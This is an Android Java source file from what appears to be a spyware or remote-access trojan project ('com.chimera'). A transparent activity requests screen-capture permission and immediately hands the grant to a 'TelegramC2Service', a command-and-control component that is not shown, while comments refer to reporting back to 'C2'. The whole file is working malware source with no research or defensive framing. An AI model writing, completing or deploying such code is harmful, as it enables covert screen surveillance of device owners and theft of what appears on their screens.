package com.chimera;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.os.Bundle;

public class ScreenshotActivity extends Activity {
    private static final int REQUEST_CODE_SCREENSHOT = 1337;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // This activity is transparent and exists only to request permission.
        requestScreenshotPermission();
    }

    private void requestScreenshotPermission() {
        try {
            MediaProjectionManager mediaProjectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            startActivityForResult(mediaProjectionManager.createScreenCaptureIntent(), REQUEST_CODE_SCREENSHOT);
        } catch (Exception e) {
            ErrorLogger.logError(this, "ScreenshotActivity_Request", e);
            finish();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_CODE_SCREENSHOT) {
            if (resultCode == Activity.RESULT_OK) {
                // Permission granted. Pass the result data to the service.
                Intent serviceIntent = new Intent(this, TelegramC2Service.class);
                serviceIntent.setAction("ACTION_SCREENSHOT_RESULT");
                serviceIntent.putExtra("resultCode", resultCode);
                serviceIntent.putExtra("resultData", data);
                startService(serviceIntent);
            } else {
                // Permission denied.
                // Optionally, send a failure message back to C2.
            }
        }
        finish(); // Close this transparent activity immediately
    }
}